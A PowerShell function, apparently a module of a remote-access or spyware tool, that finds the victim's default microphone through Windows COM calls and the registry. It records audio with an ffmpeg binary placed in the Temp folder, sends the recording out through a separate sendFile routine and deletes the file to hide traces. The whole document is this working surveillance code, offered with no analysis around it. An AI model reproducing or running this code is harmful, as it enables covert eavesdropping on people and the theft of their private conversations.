#NEED FFMPEG
function Maudio {
    param ( [int]$durationseconds = 60 )
    $outputFile = "$env:Temp\Audio.mp3"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        return (get-ItemProperty $reg).FriendlyName
    }
    $id1 = [audio]::GetDefault(1)
    $MicName = "$(getFriendlyName $id1)"
    #JUST IN CASE
    rm -Path $outputFile -Force
    .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $durationseconds -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
    sendFile -sendfilePath $outputFile | Out-Null
    sleep 1
    rm -Path $outputFile -Force
    
}